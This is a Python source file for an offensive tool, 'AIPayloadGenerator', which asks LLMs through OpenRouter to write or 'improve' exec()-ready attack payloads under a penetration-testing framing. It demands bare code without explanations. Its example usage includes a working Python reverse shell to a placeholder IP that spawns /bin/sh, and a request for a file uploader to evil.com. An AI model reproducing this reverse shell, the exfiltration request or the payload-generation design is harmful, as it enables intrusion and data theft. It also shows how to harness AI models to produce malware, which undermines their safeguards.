from datetime import datetime
import requests
import json
import time
from requests.exceptions import RequestException, Timeout
from typing import Optional, Dict, Any
from utility.setting import Setting  # Your config module

class AIPayloadGenerator:
    def __init__(self, max_retries: int = 3, timeout: int = 15):
        self.config = Setting()
        self.config.setting_var()  # Initialize config
        self.max_retries = max_retries
        self.timeout = timeout
        self.base_url = "https://openrouter.ai/api/v1/chat/completions"
        self.fallback_models = [
            "anthropic/claude-3-haiku",
            "gpt-3.5-turbo"
        ]  # Fallback models in order of preference

    def _get_api_key(self) -> str:
        """Safely retrieve API key with validation"""
        key = getattr(self.config, 'API_KEY_AI', None)
        if not key:
            raise ValueError("API_KEY_AI not found in config")
        return key

    def _build_headers(self) -> Dict[str, str]:
        return {
            "Authorization": f"Bearer {self._get_api_key()}",
            "Content-Type": "application/json",
            "HTTP-Referer": "https://example.com",
            "X-Title": "PentestTool",
        }

    def _build_payload_prompt(
        self,
        existing_payload: Optional[str] = None,
        prompt: Optional[str] = None,
        operating_system: str = "Windows"
    ) -> str:
        base_prompt = (
            "You are a penetration testing assistant.\n"
            "Return ONLY raw Python code suitable for exec() with these requirements:\n"
            "- No comments or explanations\n"
            "- Multiple commands if needed\n"
            "- OS-specific for {os}\n"
            "- Valid Python syntax\n"
            "- Penetration testing use case\n\n"
        ).format(os=operating_system)

        if existing_payload:
            base_prompt += f"MODIFY THIS PAYLOAD:\n{existing_payload}\n\n"
        if prompt:
            base_prompt += f"FOLLOW THESE INSTRUCTIONS:\n{prompt}\n\n"
        elif not existing_payload:
            base_prompt += "GENERATE 6+ RANDOM PENETRATION TESTING PAYLOADS:\n"

        return base_prompt

    def _make_api_request(
        self,
        model: str,
        messages: list,
        retry_count: int = 0
    ) -> Optional[Dict[str, Any]]:
        try:
            response = requests.post(
                url=self.base_url,
                headers=self._build_headers(),
                json={"model": model, "messages": messages},
                timeout=self.timeout
            )
            response.raise_for_status()
            return response.json()

        except (RequestException, Timeout) as e:
            if retry_count < self.max_retries:
                wait_time = min(5, (2 ** retry_count))  # Cap at 5 seconds
                print(f"Retry {retry_count + 1}/{self.max_retries}. Waiting {wait_time}s...")
                time.sleep(wait_time)
                return self._make_api_request(model, messages, retry_count + 1)
            print(f"API Request Failed: {str(e)}")
            if hasattr(e, 'response'):
                print(f"Status Code: {getattr(e.response, 'status_code', 'N/A')}")
                print(f"Response: {getattr(e.response, 'text', 'No response')}")
            return None

    def generate_payload(
        self,
        existing_payload: Optional[str] = None,
        prompt: Optional[str] = None,
        operating_system: str = "Windows",
        primary_model: str = "deepseek/deepseek-chat-v3-0324:free"
    ) -> Optional[str]:
        content = self._build_payload_prompt(existing_payload, prompt, operating_system)
        messages = [{"role": "user", "content": content}]

        # Try primary model first
        response = self._make_api_request(primary_model, messages)
        
        # Fallback chain if primary fails
        if not response and self.fallback_models:
            for fallback_model in self.fallback_models:
                print(f"Trying fallback model: {fallback_model}")
                response = self._make_api_request(fallback_model, messages)
                if response:
                    break

        if response:
            try:
                return response["choices"][0]["message"]["content"].strip()
            except (KeyError, IndexError, AttributeError) as e:
                print(f"Response parsing error: {e}")
                print(f"Raw response: {json.dumps(response, indent=2)[:500]}...")  # Truncate long responses
        return None

    @staticmethod
    def print_payload(payload: str, title: str = "AI PAYLOAD RESPONSE", save_payload: bool = False) -> None:
        config = Setting()
        config.setting_var()
        if not payload:
            print("❌ Failed to generate payload")
            return
            
        print(f"\n{'='*50}")
        print(f"🔧 {title}")
        print(f"{'='*50}\n")
        if save_payload:
            with open(f"{config.STATIC_DIR}/{datetime.now().strftime('%Y%m%d_%H%M%S')}.py", "w") as f:
                f.write(payload)
            print(f"Payload saved to static/py/{datetime.now().strftime('%Y%m%d_%H%M%S')}.py")
        print(payload)
        print(f"\n{'='*50}")
        print(f"📏 Length: {len(payload)} chars")
        print(f"{'='*50}")


# Example Usage
if __name__ == "__main__":
    # Initialize with default retry/timeout settings
    generator = AIPayloadGenerator(max_retries=3, timeout=20)

    # Example 1: Payload modification
    modified_payload = generator.generate_payload(
        existing_payload = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('YOUR_IP',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);",
        prompt="Improve the payload for Windows",
        operating_system="Windows"
    )
    generator.print_payload(modified_payload, "MODIFIED PAYLOAD", save_payload=True)

    # Example 2: New payload from prompt
    upload_payload = generator.generate_payload(
        prompt="Create file uploader to http://evil.com/upload",
        operating_system="windows",
    )
    generator.print_payload(upload_payload, "UPLOAD PAYLOAD", save_payload=True)
    # Example 3: Random payloads
    random_payloads = generator.generate_payload(operating_system="Windows")
    generator.print_payload(random_payloads, "RANDOM PAYLOADS", save_payload=True)